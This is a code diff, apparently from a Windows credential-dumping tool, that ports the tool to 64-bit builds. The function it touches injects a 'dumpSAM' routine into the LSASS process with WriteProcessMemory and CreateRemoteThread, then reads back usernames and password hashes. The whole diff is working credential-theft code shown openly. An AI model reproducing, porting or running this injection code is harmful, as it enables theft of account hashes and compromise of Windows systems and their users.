@@ -384,7 +384,11 @@ cleanup:
 	return dwError;
 }
 
+#ifdef _WIN64
+#define sizer setArgs
+#else
 void sizer() { __asm { ret } }
+#endif
 
 /* initialize the context structure - returns 0 on success, return 1 on error */
 int setArgs(FUNCTIONARGS *fargs, DWORD dwMillisecondsToWait) {
@@ -463,7 +467,8 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 	HANDLE hThreadHandle = NULL, hLsassHandle = NULL, hReadLock = NULL, hFreeLock = NULL;
 	LPVOID pvParameterMemory = NULL, pvFunctionMemory = NULL;
 	int FunctionSize;
-	DWORD dwBytesWritten = 0, dwThreadId = 0, dwBytesRead = 0, dwNumberOfUsers = 0, dwCurrentUserIndex = 0, HashIndex = 0;
+	SIZE_T sBytesWritten = 0, sBytesRead = 0;
+	DWORD dwThreadId = 0, dwNumberOfUsers = 0, dwCurrentUserIndex = 0, HashIndex = 0;
 	FUNCTIONARGS InitFunctionArguments, FinalFunctionArguments;
 	USERNAMEHASH *UsernameHashResults = NULL;
 	PVOID UsernameAddress = NULL;
@@ -516,18 +521,18 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		if (pvParameterMemory == NULL) { dwError = 1; break; }
 
 		/* write context structure into remote process */
-		if (WriteProcessMemory(hLsassHandle, pvParameterMemory, &InitFunctionArguments, sizeof(InitFunctionArguments), &dwBytesWritten) == 0) { dwError = 1; break; }
-		if (dwBytesWritten != sizeof(InitFunctionArguments)) { dwError = 1; break; }
-		dwBytesWritten = 0;
+		if (WriteProcessMemory(hLsassHandle, pvParameterMemory, &InitFunctionArguments, sizeof(InitFunctionArguments), &sBytesWritten) == 0) { dwError = 1; break; }
+		if (sBytesWritten != sizeof(InitFunctionArguments)) { dwError = 1; break; }
+		sBytesWritten = 0;
 
 		/* allocate memory for the function */
 		pvFunctionMemory = VirtualAllocEx(hLsassHandle, NULL, FunctionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (pvFunctionMemory == NULL) { dwError = 1; break; }
 
 		/* write the function into the remote process */
-		if (WriteProcessMemory(hLsassHandle, pvFunctionMemory, dumpSAM, FunctionSize, &dwBytesWritten) == 0) { dwError = 1; break; }
-		if (dwBytesWritten != FunctionSize) { dwError = 1; break; }
-		dwBytesWritten = 0;
+		if (WriteProcessMemory(hLsassHandle, pvFunctionMemory, dumpSAM, FunctionSize, &sBytesWritten) == 0) { dwError = 1; break; }
+		if (sBytesWritten != FunctionSize) { dwError = 1; break; }
+		sBytesWritten = 0;
 
 		/* start the remote thread */
 		if ((hThreadHandle = CreateRemoteThread(hLsassHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pvFunctionMemory, pvParameterMemory, 0, &dwThreadId)) == NULL) { dwError = 1; break; }
@@ -540,9 +545,9 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		}
 
 		/* read results of the injected function */
-		if (ReadProcessMemory(hLsassHandle, pvParameterMemory, &FinalFunctionArguments, sizeof(InitFunctionArguments), &dwBytesRead) == 0) { dwError = 1; break; }
-		if (dwBytesRead != sizeof(InitFunctionArguments)) { dwError = 1; break; }
-		dwBytesRead = 0;
+		if (ReadProcessMemory(hLsassHandle, pvParameterMemory, &FinalFunctionArguments, sizeof(InitFunctionArguments), &sBytesRead) == 0) { dwError = 1; break; }
+		if (sBytesRead != sizeof(InitFunctionArguments)) { dwError = 1; break; }
+		sBytesRead = 0;
 
 		/* allocate space for the results */
 		UsernameHashResults = (USERNAMEHASH *)malloc(FinalFunctionArguments.dwDataSize);
@@ -552,9 +557,9 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		dwNumberOfUsers = FinalFunctionArguments.dwDataSize / sizeof(USERNAMEHASH);
 
 		/* copy the context structure */
-		if (ReadProcessMemory(hLsassHandle, FinalFunctionArguments.pUsernameHashData, UsernameHashResults, FinalFunctionArguments.dwDataSize, &dwBytesRead) == 0) { break; }
-		if (dwBytesRead != FinalFunctionArguments.dwDataSize) { break; }
-		dwBytesRead = 0;
+		if (ReadProcessMemory(hLsassHandle, FinalFunctionArguments.pUsernameHashData, UsernameHashResults, FinalFunctionArguments.dwDataSize, &sBytesRead) == 0) { break; }
+		if (sBytesRead != FinalFunctionArguments.dwDataSize) { break; }
+		sBytesRead = 0;
 
 		// save the old mem addy, malloc new space, copy over the data, free the old mem addy
 		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {
@@ -563,8 +568,8 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 			UsernameHashResults[dwCurrentUserIndex].Username = (char *)malloc(UsernameHashResults[dwCurrentUserIndex].Length);
 			if (UsernameHashResults[dwCurrentUserIndex].Username == NULL) { dwError = 1; break; }
 
-			if (ReadProcessMemory(hLsassHandle, UsernameAddress, UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].Length, &dwBytesRead) == 0) { dwError = 1; break; }
-			if (dwBytesRead != UsernameHashResults[dwCurrentUserIndex].Length) { dwError = 1; break; }
+			if (ReadProcessMemory(hLsassHandle, UsernameAddress, UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].Length, &sBytesRead) == 0) { dwError = 1; break; }
+			if (sBytesRead != UsernameHashResults[dwCurrentUserIndex].Length) { dwError = 1; break; }
 		}
 
 		/* signal that all data has been read and wait for the remote memory to be free'd */
